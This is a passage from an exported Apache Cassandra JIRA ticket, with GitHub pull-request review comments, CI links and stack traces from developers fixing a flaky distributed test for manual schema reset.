+     * There is a 2-node cluster and a table one created. The schema version is agreed on both nodes. Then the 2nd node
+     * is shutdown, and we introduce a disagreement by dropping table one and creating table two. Therefore, 1st node
+     * has a newer schema version with table two, while the shutdown 2nd node has older schema version with table one.
+     * <p>
+     * At this point, if we just start 2nd node, it synces its schema by getting the fresh mutations from 1st node which

Review Comment:
   typo: syncs



;12/Sep/22 16:21;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r968851706


##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -93,70 +99,98 @@ private void selectSilent(Cluster cluster, String name)
             Throwable cause = e;
             while (cause != null)
             {
-                if (cause.getMessage() != null && cause.getMessage().contains(""Unknown column ""+name+"" during deserialization""))
+                if (cause.getMessage() != null && cause.getMessage().contains(""Unknown column "" + name + "" during deserialization""))
                     causeIsUnknownColumn = true;
                 cause = cause.getCause();
             }
             assertTrue(causeIsUnknownColumn);
         }
     }
 
+    /**
+     * The purpose of this test is to verify manual schema reset functinality.
+     * <p>
+     * There is a 2-node cluster and a table one created. The schema version is agreed on both nodes. Then the 2nd node

Review Comment:
   I would use the names here probably `tbl_one` or so.



;12/Sep/22 19:31;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r968869167


##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -93,70 +99,98 @@ private void selectSilent(Cluster cluster, String name)
             Throwable cause = e;
             while (cause != null)
             {
-                if (cause.getMessage() != null && cause.getMessage().contains(""Unknown column ""+name+"" during deserialization""))
+                if (cause.getMessage() != null && cause.getMessage().contains(""Unknown column "" + name + "" during deserialization""))
                     causeIsUnknownColumn = true;
                 cause = cause.getCause();
             }
             assertTrue(causeIsUnknownColumn);
         }
     }
 
+    /**
+     * The purpose of this test is to verify manual schema reset functinality.
+     * <p>
+     * There is a 2-node cluster and a table one created. The schema version is agreed on both nodes. Then the 2nd node
+     * is shutdown, and we introduce a disagreement by dropping table one and creating table two. Therefore, 1st node
+     * has a newer schema version with table two, while the shutdown 2nd node has older schema version with table one.
+     * <p>
+     * At this point, if we just start 2nd node, it synces its schema by getting the fresh mutations from 1st node which
+     * results that both nodes have only the definition of table two.
+     * <p>
+     * However, before starting 2nd we reset the schema on 1st node, so that its schema is discarded whenever it manages
+     * to fetch schema from any node. So in this case, it ends up with both nodes having only the definition of table one.
+     * <p>
+     * In the second phase of the test, we simply break the schema on 1st node and call reset to fetch it from 2nd node.
+     */
     @Test
     public void schemaReset() throws Throwable
     {
         CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
         CassandraRelevantProperties.SCHEMA_PULL_INTERVAL_MS.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
-            cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
-
-            assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
-            assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
-
-            // now we have a table tbl in the schema of both nodes
+            // crate table one and make sure it got propagated
+            cluster.schemaChange(String.format(""CREATE TABLE %s.%s (pk INT PRIMARY KEY, v TEXT)"", KEYSPACE, TABLE_ONE));
+            assertTrue(checkTables(cluster.get(1), true, false));
+            assertTrue(checkTables(cluster.get(2), true, false));
 
+            // shutdown node 2 and make sure that node 1 does see it any longer as alive
             cluster.get(2).shutdown().get();
-
-            Awaitility.await().atMost(Duration.ofSeconds(30)) // wait until node 1 notices that node 2 is dead
-                      .until(() -> cluster.get(1).callOnInstance(() -> Gossiper.instance.getLiveMembers()
-                                                                                        .stream().allMatch(e -> e.equals(FBUtilities.getBroadcastAddressAndPort()))));
+            await(30).until(() -> cluster.get(1).callOnInstance(() -> {
+                return Gossiper.instance.getLiveMembers()
+                                        .stream()
+                                        .allMatch(e -> e.equals(getBroadcastAddressAndPort()));
+            }));
 
             // when there is no node to fetch the schema from, reset local schema should immediately fail
             Assertions.assertThatExceptionOfType(RuntimeException.class).isThrownBy(() -> {
                 cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
             }).withMessageContaining(""Cannot reset local schema when there are no other live nodes"");
 
-            // now, let's make a disagreement, the shutdown node 2 has a definition of tbl, while the running node 1 does not
-            cluster.get(1).runOnInstance(() -> {
-                Schema.instance.transform(current -> Schema.instance.distributedKeyspaces().without(KEYSPACE), false);
-             });
-
-            assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") == null));
+            // now, let's make a disagreement, the shutdown node 2 has a definition of table one, while
+            // the running node 2 will have definitions of table two
+            cluster.coordinator(1).execute(String.format(""DROP TABLE %s.%s"", KEYSPACE, TABLE_ONE), ConsistencyLevel.ONE);
+            cluster.coordinator(1).execute(String.format(""CREATE TABLE %s.%s (pk INT PRIMARY KEY, v TEXT)"", KEYSPACE, TABLE_TWO), ConsistencyLevel.ONE);
+            await(30).until(() -> checkTables(cluster.get(1), false, true));
 
-            // clear will wait until it receives schema from some other node
-            // also if we start the node2 first, schema of node2 will be synced to schema of node1 because node1 has the newest change (dropping the table)
-            // if we run clean on node1 first, it will advertise empty schema to node2 and apply the schema from it without merging
-            CompletableFuture<Boolean> clear1 = CompletableFuture.supplyAsync(() -> cluster.get(1).callOnInstance(() -> Schema.instance.updateHandler.clear().awaitUninterruptibly(1, TimeUnit.MINUTES)));
+            // Schema.resetLocalSchema is guarded by some conditions which would not let us reset schema if there is no
+            // live node in the cluster; therefore we simply call SchemaUpdateHandler.clear
+            SerializableCallable<Boolean> clear = () -> Schema.instance.updateHandler.clear().awaitUninterruptibly(1, TimeUnit.MINUTES);
+            Future<Boolean> clear1 = cluster.get(1).asyncCallsOnInstance(clear).call();
             assertFalse(clear1.isDone());
 
             // when the other node is started, schema should be back in sync
             cluster.get(2).startup();
-            assertTrue(clear1.get());
+            await(30).until(() -> clear1.isDone() && clear1.get());
 
             // this proves node1 reset schema works - the most recent change should be discarded because it receives
             // the schema from node2 and applies it on a clean schema
-            Awaitility.waitAtMost(Duration.ofMinutes(1))
-                      .pollDelay(Duration.ofSeconds(1))
-                      .until(() -> cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
+            await(60).until(() -> checkTables(cluster.get(1), true, false));
 
             // now let's break schema locally and let it be reset
             cluster.get(1).runOnInstance(() -> Schema.instance.getLocalKeyspaces()
                                                               .get(SchemaConstants.SCHEMA_KEYSPACE_NAME)
                                                               .get().tables.forEach(t -> ColumnFamilyStore.getIfExists(t.keyspace, t.name).truncateBlockingWithoutSnapshot()));
+
             // when schema is removed and there is a node to fetch it from, node 1 should immediatelly restore the schema
             cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
-            assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
+            // note that we should not wait for this to be true because resetLocalSchema is blocking
+            // and after successfully completing it, the schema should be already back in sync
+            assertTrue(checkTables(cluster.get(1), true, false));
+            assertTrue(checkTables(cluster.get(2), true, false));
         }
     }
 
+    private static ConditionFactory await(int seconds)
+    {
+        return Awaitility.await().atMost(ofSeconds(seconds)).pollDelay(ofSeconds(1));
+    }
+
+    private static boolean checkTables(IInvokableInstance instance, boolean one, boolean two)

Review Comment:
   I would probably change this name to `checkTablesPropagated` or something



;12/Sep/22 19:46;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r968617828


##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -93,70 +99,98 @@ private void selectSilent(Cluster cluster, String name)
             Throwable cause = e;
             while (cause != null)
             {
-                if (cause.getMessage() != null && cause.getMessage().contains(""Unknown column ""+name+"" during deserialization""))
+                if (cause.getMessage() != null && cause.getMessage().contains(""Unknown column "" + name + "" during deserialization""))
                     causeIsUnknownColumn = true;
                 cause = cause.getCause();
             }
             assertTrue(causeIsUnknownColumn);
         }
     }
 
+    /**
+     * The purpose of this test is to verify manual schema reset functinality.
+     * <p>
+     * There is a 2-node cluster and a table one created. The schema version is agreed on both nodes. Then the 2nd node
+     * is shutdown, and we introduce a disagreement by dropping table one and creating table two. Therefore, 1st node
+     * has a newer schema version with table two, while the shutdown 2nd node has older schema version with table one.
+     * <p>
+     * At this point, if we just start 2nd node, it synces its schema by getting the fresh mutations from 1st node which

Review Comment:
   typo: `syncs`



;12/Sep/22 19:47;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r968872219


##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -93,70 +99,98 @@ private void selectSilent(Cluster cluster, String name)
             Throwable cause = e;
             while (cause != null)
             {
-                if (cause.getMessage() != null && cause.getMessage().contains(""Unknown column ""+name+"" during deserialization""))
+                if (cause.getMessage() != null && cause.getMessage().contains(""Unknown column "" + name + "" during deserialization""))
                     causeIsUnknownColumn = true;
                 cause = cause.getCause();
             }
             assertTrue(causeIsUnknownColumn);
         }
     }
 
+    /**
+     * The purpose of this test is to verify manual schema reset functinality.
+     * <p>
+     * There is a 2-node cluster and a table one created. The schema version is agreed on both nodes. Then the 2nd node
+     * is shutdown, and we introduce a disagreement by dropping table one and creating table two. Therefore, 1st node
+     * has a newer schema version with table two, while the shutdown 2nd node has older schema version with table one.
+     * <p>
+     * At this point, if we just start 2nd node, it synces its schema by getting the fresh mutations from 1st node which
+     * results that both nodes have only the definition of table two.
+     * <p>
+     * However, before starting 2nd we reset the schema on 1st node, so that its schema is discarded whenever it manages
+     * to fetch schema from any node. So in this case, it ends up with both nodes having only the definition of table one.
+     * <p>
+     * In the second phase of the test, we simply break the schema on 1st node and call reset to fetch it from 2nd node.
+     */
     @Test
     public void schemaReset() throws Throwable
     {
         CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
         CassandraRelevantProperties.SCHEMA_PULL_INTERVAL_MS.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
-            cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
-
-            assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
-            assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
-
-            // now we have a table tbl in the schema of both nodes
+            // crate table one and make sure it got propagated
+            cluster.schemaChange(String.format(""CREATE TABLE %s.%s (pk INT PRIMARY KEY, v TEXT)"", KEYSPACE, TABLE_ONE));
+            assertTrue(checkTables(cluster.get(1), true, false));
+            assertTrue(checkTables(cluster.get(2), true, false));
 
+            // shutdown node 2 and make sure that node 1 does see it any longer as alive
             cluster.get(2).shutdown().get();
-
-            Awaitility.await().atMost(Duration.ofSeconds(30)) // wait until node 1 notices that node 2 is dead
-                      .until(() -> cluster.get(1).callOnInstance(() -> Gossiper.instance.getLiveMembers()
-                                                                                        .stream().allMatch(e -> e.equals(FBUtilities.getBroadcastAddressAndPort()))));
+            await(30).until(() -> cluster.get(1).callOnInstance(() -> {
+                return Gossiper.instance.getLiveMembers()
+                                        .stream()
+                                        .allMatch(e -> e.equals(getBroadcastAddressAndPort()));
+            }));
 
             // when there is no node to fetch the schema from, reset local schema should immediately fail
             Assertions.assertThatExceptionOfType(RuntimeException.class).isThrownBy(() -> {
                 cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
             }).withMessageContaining(""Cannot reset local schema when there are no other live nodes"");
 
-            // now, let's make a disagreement, the shutdown node 2 has a definition of tbl, while the running node 1 does not
-            cluster.get(1).runOnInstance(() -> {
-                Schema.instance.transform(current -> Schema.instance.distributedKeyspaces().without(KEYSPACE), false);
-             });
-
-            assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") == null));
+            // now, let's make a disagreement, the shutdown node 2 has a definition of table one, while
+            // the running node 2 will have definitions of table two

Review Comment:
   `a definition`



;12/Sep/22 19:50;githubbot;600","jacek-lewandowski commented on PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#issuecomment-1249047763

   Merged to cassandra-4.1 in d8bbeb9e398723e5efe13166e16372d104fb93ce
   


;16/Sep/22 08:02;githubbot;600","jacek-lewandowski closed pull request #1804: CASSANDRA-17819: Fix resetting the schema
URL: https://github.com/apache/cassandra/pull/1804


;16/Sep/22 08:02;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,24000,,,0,24000,,,,,,,,,CASSANDRA-17903,,,,,,,,,,,,CASSANDRA-17658,CASSANDRA-17972,,,,,CASSANDRA-18151,,,,,,,,,,CASSANDRA-17883,CASSANDRA-17884,CASSANDRA-17886,,,,,,,,0.0,jlewandowski,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jan 12 08:34:22 UTC 2023,,,,,,,All,,,,"0|z17sog:",9223372036854775807,,,,adelapena,edimitrova,,,Low,,4.0,,https://github.com/apache/cassandra/commit/76be530a364b376c1d69d8447230ad5cf023be7f,,,,,,,,,Flaky test,,,,,"16/Aug/22 11:38;adelapena;CC [~jlaskowski] [~edimitrova] ;;;","17/Aug/22 21:42;e.dimitrova;I think you meant to ping [~jlewandowski] actually :) 

Ok, I hoped for it to be just our Jenkins turtle but it seems with 10 seconds and [two minutes|https://github.com/ekaterinadimitrova2/cassandra/commit/f0e1c893918a8af9de4a51b44c61f80994f98f39] the test fails with about the same frequency respectively [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1872/workflows/c96fb0fa-434b-4d4e-8023-7a80e9accfed/jobs/14677] and [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1873/workflows/f632eb7a-48a2-46e9-aa7b-d3d77679e2ca/jobs/14682/tests#failed-test-0] (4.1 branch) and also in two ways - the one in the ticket description and with a NullPointerException:
{code:java}
java.lang.NullPointerException at org.apache.cassandra.schema.SchemaKeyspace.applyChanges(SchemaKeyspace.java:1256) at org.apache.cassandra.schema.DefaultSchemaUpdateHandler.applyMutations(DefaultSchemaUpdateHandler.java:186) at org.apache.cassandra.schema.DefaultSchemaUpdateHandler.reset(DefaultSchemaUpdateHandler.java:262) at org.apache.cassandra.schema.Schema.resetLocalSchema(Schema.java:624) at org.apache.cassandra.distributed.test.SchemaTest.lambda$schemaReset$81c80a4a$1(SchemaTest.java:108) at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81) at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47) at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57) at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.base/java.lang.Thread.run(Thread.java:829){code}
I need to dig into the logs reminding myself about what s going on...it's been a month since I looked into that ticket. ;;;","18/Aug/22 01:14;e.dimitrova;I got curious and pushed the new test with the code before CASSANDRA-17658 was committed and [it seems|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1874/workflows/6d60a052-e3f6-44c2-9812-8ba863b32838/jobs/14687/tests#failed-test-0] the timeout error was already there, the NullPointerException is new. ;;;","18/Aug/22 04:22;jlewandowski;[~e.dimitrova] would you like me to take this one?;;;","18/Aug/22 08:22;jlewandowski;I think I know the solution;;;","18/Aug/22 12:27;e.dimitrova;I was about to debug it today, haven’t started yet so if you already have an idea for solution, that will be great. Thanks:) Reassigning the ticket to you;;;","18/Aug/22 14:58;jlewandowski;So the timeout exception is a probably schema disagreement problem - I could reproduce it reliably for for 4.1 and 4.0 as well, so it is not introduced by either CASSANDRA-17044 or CASSANDRA-17658. From what I found so far this is some problem in {{MigrationCoordinator}} which does not let to pull the schema due to some conditions which decide whether to pull or not. I'll keep investigating. 

The NPE problem is probably solely related to reset schema functionality, the request to get the schema gets expired before it is sent. I'm going to try a simple retry for this problem, but first want to figure out the timeout thing.
;;;","19/Aug/22 12:01;jlewandowski;https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/257/workflows/0b864a1b-efd9-4c08-8294-a1a891933820/jobs/1786

We will see how the rest of the tests look like;;;","19/Aug/22 21:15;e.dimitrova;CI-wise the test seems fine but the patch broke org.apache.cassandra.distributed.test.jmx.JMXGetterCheckTest

I made a quick skim but it will take me some time to dig into the details. I left a few immediate small comments on the commit, more on Monday.

We need also 4.0 patch right? 

Maybe [~adelapena] will also want to take a look at the changes? ;;;","22/Aug/22 06:45;jlewandowski;OK, so I've created much simpler patch, without refactoring of MigrationCoordinator - https://github.com/apache/cassandra/pull/1804

{{SchemaTest}} repeated x100 [here|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/258/workflows/8f629e55-2dda-4d0a-bf7c-5cde9656328e/jobs/1808];;;","22/Aug/22 10:06;adelapena;{quote}Maybe [~adelapena] will also want to take a look at the changes? 
{quote}
Sure, I'll take a look.;;;","23/Aug/22 13:38;adelapena;Just started some additional repeated runs for all the modified tests:
||Test||CI||
|o.a.c.schema.SchemaTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2001/workflows/0fdc2c4a-3b6e-4908-b268-d8c70943d732] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2001/workflows/71998f6e-e020-403d-a0b3-3ce8cef7990e]|
|o.a.c.distributed.test.SchemaTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2002/workflows/afb88a8e-94e7-46c7-a3d9-b0a5e4f33ed6] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2002/workflows/d60ab633-f080-4aa1-8348-6bc0de9ed11f]|
|o.a.c.distributed.test.MigrationCoordinatorTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2003/workflows/d3b21034-f3e7-4c10-8e76-1edf5c18ca05] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2003/workflows/dca2887b-47b2-45d0-ba92-c0f7ec07b2c0]|
|o.a.c.distributed.test.JMXGetterCheckTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2004/workflows/53d3d4b9-12b6-45a5-915b-30b6a9d9a53b] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2004/workflows/ada12085-c1d9-450f-8261-feeae1b25143]|;;;","23/Aug/22 14:31;adelapena;It seems that {{org.apache.cassandra.distributed.test.SchemaTest.schemaReset}} for [the last version of the patch|https://github.com/apache/cassandra/pull/1804/commits/b66bcfc9cfe7114f6f372ef07711c40d2cc5cf64] is flaky in the runs right above ([j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2002/workflows/afb88a8e-94e7-46c7-a3d9-b0a5e4f33ed6] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2002/workflows/d60ab633-f080-4aa1-8348-6bc0de9ed11f]). It has been repeatedly run with its entire suite, instead of just running the {{schemaReset}} method in isolation:
{code:java}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=test-jvm-dtest-some \
  -e REPEATED_UTEST_COUNT=400 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.distributed.test.SchemaTest
{code};;;","24/Aug/22 00:49;e.dimitrova;Left some questions on the PR. I need to spend a bit more time on this. ;;;","26/Aug/22 17:27;jlewandowski;[~adelapena]  the last flakiness was a stupid thing in a test ([https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/267/workflows/871cd358-f173-458d-907d-34e59e4b205c/jobs/1959)]

 

I'll apply the comments, though I want to discuss the solution;;;","26/Aug/22 18:49;jlewandowski;I've applied one more modification in semantics. Now I think it works quite consistently. 

When a caller requests schema reset, we do nothing to the schema, but instead we set a flag that the reset was requested.

This flag tricks coordinator so that it thinks the node has empty schema. This will make it apply whatever schema which is received. And when the schema is received while the flag is set, the schema mutations are applied on a truncated schema table instead of merging. The flag is then cleared. If we don't manage to receive a schema within a timeout, we simply clear the flag and throw exception. This way, unless we receive the schema from other node, we do not touch the existing schema.

 ;;;","26/Aug/22 20:38;jlewandowski;https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/270/workflows/947d9f96-ec7a-44c8-86a7-31e246de47c8/jobs/1965;;;","27/Aug/22 11:35;adelapena;Great, here is a full CI run including 400 repeated runs of the entire {{o.a.c.distributed.test.SchemaTest}} class:
 * j8: [https://app.circleci.com/pipelines/github/adelapena/cassandra/2015/workflows/365c22ee-4c9d-4cbd-8961-8a7198237121]
 * j11: [https://app.circleci.com/pipelines/github/adelapena/cassandra/2015/workflows/379e7af3-ca8e-427a-9804-cc34bed08426]

I'll take a closer look early this next week.;;;","29/Aug/22 05:24;jlewandowski;Thank you [~adelapena] for running that.;;;","29/Aug/22 13:57;e.dimitrova;Oh great! CI is fully green! (/) 

I will be looking into the latest changes today, thank you both!;;;","06/Sep/22 12:40;jlewandowski;[~bdeggleston] do you want to take a look before we move forward with this?;;;","07/Sep/22 18:16;bdeggleston;yes, thanks. I'm taking a look at this today;;;","07/Sep/22 23:02;bdeggleston;I haven't been able to give this a full review, but I did look through it and didn't notice anything I object to;;;","08/Sep/22 15:05;jlewandowski;|| PR || j8 || j11 ||
| [4.0|https://github.com/apache/cassandra/pull/1850]   | [(!)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/275/workflows/2d6b9367-a793-427e-9dee-65bc1a967c5a] | [(/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/275/workflows/3349df67-0f89-4a1f-9619-5fcec22e5b2e] |
| [4.1|https://github.com/apache/cassandra/pull/1804]   | [(/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/273/workflows/f231f426-6435-4b49-974c-34a3b31e070c] | [(/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/273/workflows/4ea95887-0613-436f-87bd-90f817c5dda6] |
| [trunk|https://github.com/apache/cassandra/pull/1849] | [(/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/272/workflows/59976998-50e7-42f4-bac9-b95dbd5d0635] | [(/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/272/workflows/0098baea-f393-4a8f-8478-b7e95e6ece07] |
;;;","08/Sep/22 15:36;adelapena;Just started some repeated runs for the new/updated PRs:
||Test||4.0||4.1||trunk||
|o.a.c.schema.SchemaTest                        |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2057/workflows/25bfbad2-1710-4fc3-b320-e030441bf300]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2061/workflows/6d2cf627-9998-429e-bffb-002146978c05]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2065/workflows/93d58e23-e716-4ef6-94bf-c889b7991fde]|
|o.a.c.distributed.test.SchemaTest              |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2058/workflows/75741ce6-3948-4ac4-912b-15b275159a8a] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2058/workflows/18c1be08-fc65-4587-a87f-5246b6dce31b]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2062/workflows/182c46bf-8558-4dd4-bd5f-df803a596d19] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2062/workflows/3f78dc99-0a54-4a8a-824a-5247fd71fc06]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2066/workflows/c01f38e3-2563-4d27-8bd4-ee2d942769a1] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2066/workflows/87ede39e-9d3c-4c12-a523-4d649e3cdcfa]|
|o.a.c.distributed.test.MigrationCoordinatorTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2059/workflows/0b7fe946-6703-4ec6-b591-9ff4b1bef955]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2063/workflows/8ec55afa-14f7-4dcf-8dda-ea079500dd38]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2067/workflows/4540dbad-2008-47c0-bb65-f1b13c00cbbb]|
|o.a.c.distributed.test.JMXGetterCheckTest      | |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2064/workflows/c4c370d9-0d0a-4494-8759-0cd69a301ea4]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2068/workflows/1c3f4891-d335-49f2-b441-b71c8ae254a9]|;;;","08/Sep/22 15:39;jlewandowski;Thank you [~adelapena] ;;;","08/Sep/22 23:08;e.dimitrova;{quote}I haven't been able to give this a full review, but I did look through it and didn't notice anything I object to
{quote}
Thanks, [~bdeggleston] . We should also add a note in NEWS.txt about the change of behavior , only in 4.1 (the flag described by [~jlewandowski] , unless we receive the schema from other node, we do not touch the existing schema.)

I left a few questions on the 4.0 patch. Not sure whether we are allowed in patch release to change public method behavior.

About the OOM we saw in the tests, it doesn't seem related to me but probably we need follow up ticket, at least? I will sleep on It tonight and reconsider it tomorrow

Also, I think we need a follow up ticket for [this|https://github.com/apache/cassandra/pull/1804/files#diff-7ec9aec4bfac15563e5c4b3df8177622466d08bb79ee64effacdff6f019fda35R529] TODO. ;;;","09/Sep/22 06:29;jlewandowski;I've just looked into those OOMs, sorry, yesterday I was probably too tired to read them...
 
{noformat}
[junit-timeout] Testsuite: org.apache.cassandra.distributed.test.SchemaTest
[junit-timeout] Exception in thread ""main"" java.lang.OutOfMemoryError: Java heap space
[junit-timeout] 	at java.util.Arrays.copyOf(Arrays.java:3332)
[junit-timeout] 	at java.lang.AbstractStringBuilder.ensureCapacityInternal(AbstractStringBuilder.java:124)
[junit-timeout] 	at java.lang.AbstractStringBuilder.append(AbstractStringBuilder.java:448)
[junit-timeout] 	at java.lang.StringBuffer.append(StringBuffer.java:270)
[junit-timeout] 	at org.apache.cassandra.CassandraBriefJUnitResultFormatter.endTestSuite(CassandraBriefJUnitResultFormatter.java:174)
[junit-timeout] 	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.fireEndTestSuite(JUnitTestRunner.java:853)
[junit-timeout] 	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.run(JUnitTestRunner.java:577)
[junit-timeout] 	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.launch(JUnitTestRunner.java:1196)
[junit-timeout] 	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.main(JUnitTestRunner.java:1041)
[junit-timeout] Testsuite: org.apache.cassandra.distributed.test.SchemaTest
[junit-timeout] Testsuite: org.apache.cassandra.distributed.test.SchemaTest Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 0 sec
[junit-timeout] 
[junit-timeout] Testcase: org.apache.cassandra.distributed.test.SchemaTest:readRepair:	Caused an ERROR
[junit-timeout] Forked Java VM exited abnormally. Please note the time in the report does not reflect the time until the VM exit.
[junit-timeout] junit.framework.AssertionFailedError: Forked Java VM exited abnormally. Please note the time in the report does not reflect the time until the VM exit.
[junit-timeout] 	at java.util.Vector.forEach(Vector.java:1277)

{noformat}

1. both OOMs are identical
2. they happen for {{readRepair}} test, which is completely unrelated to the change
3. they indicate the problem in the code which generates JUnit report after the test is done... I suppose the log flooding with more log messages may have something to do with it - there is nothing suggesting there is something beyond that 

I'll fix the log flooding problem
;;;","09/Sep/22 08:30;jlewandowski;No OOMs on 4.0 any more: https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/278/workflows/95bb6907-220c-436a-a11b-464ea3493b60/jobs/2071
4.0 pre-commit tests look surprisingly good as well
;;;","12/Sep/22 07:37;jlewandowski;[~e.dimitrova] [~adelapena] I've applied some of the remaining comments and reran the test: [j11|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/281/workflows/e6094c00-b611-4772-9772-205f4c76ecba], [j8|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/281/workflows/6ae07ab4-8acb-4414-b041-88d776595703], [repeated SchemaTest|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/281/workflows/6c97760d-9443-489d-a621-0ea9ab93d85c] for 4.0 branch;;;","12/Sep/22 12:19;adelapena;The test failure in {{testNoTreesRetainedAfterDifference}} is not reported on Butler, but it seems to be reproducible in unpatched 4.0 with j11: [https://app.circleci.com/pipelines/github/adelapena/cassandra/2076/workflows/8adbfe99-afb5-43af-84ad-43df2a2a86e2/jobs/20816/tests]

Created CASSANDRA-17884 for it.;;;","12/Sep/22 14:55;adelapena;The failure of {{test_drop_with_stopped_build}} can be reproduced in unpatched 4.0 with j11: [https://app.circleci.com/pipelines/github/adelapena/cassandra/2079/workflows/67b3a8fd-54f8-49bf-9984-722799e5db1c/jobs/20826]

-I'll open a ticket for it.- Created CASSANDRA-17886 for it.;;;","12/Sep/22 15:05;adelapena;The error in {{TestIncRepair::test_multiple_repair}} seems already reported in CASSANDRA-17005. So all good in the 4.0 run (y);;;","13/Sep/22 10:47;jlewandowski;4.1 https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/284/workflows/d2957022-9d2b-48a4-80b6-0512e5887751 (including repeated)
trunk https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/285/workflows/8d17a0d4-4c9f-46c3-9975-d9eabb13e3b5 (including repeated)

